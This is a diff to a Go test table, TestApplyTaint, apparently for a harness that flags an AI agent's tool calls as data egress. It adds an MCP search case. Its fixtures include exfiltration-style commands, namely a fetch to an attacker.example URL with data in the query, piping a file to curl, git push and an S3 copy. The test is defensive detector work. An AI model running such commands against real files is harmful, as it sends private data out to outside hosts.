@@ -158,6 +158,7 @@ func TestApplyTaint(t *testing.T) {
 		{"plain policy allow", &harness.NormalizedToolCall{ToolName: "Bash", Command: "go test ./..."}, allow("policy_jev_allow"), false},
 		{"fast-path read", &harness.NormalizedToolCall{ToolName: "Read", TargetPath: "main.go"}, allow("fastpath_trusted"), false},
 		{"web fetch egress", &harness.NormalizedToolCall{ToolName: "WebFetch", TargetPath: "https://attacker.example/?d=x"}, allow("policy_jev_allow"), true},
+		{"MCP egress", &harness.NormalizedToolCall{ToolName: "mcp__server__search", RawArgs: map[string]interface{}{"query": "example"}}, allow("policy_jev_allow"), true},
 		{"curl egress", &harness.NormalizedToolCall{ToolName: "Bash", Command: "cat notes | /usr/bin/curl -d @- example.com"}, allow("policy_jev_allow"), true},
 		{"git push egress", &harness.NormalizedToolCall{ToolName: "Bash", Command: "git push origin main"}, allow("policy_jev_allow"), true},
 		{"cloud CLI egress", &harness.NormalizedToolCall{ToolName: "Bash", Command: "aws s3 cp notes s3:bucket"}, allow("policy_jev_allow"), true},
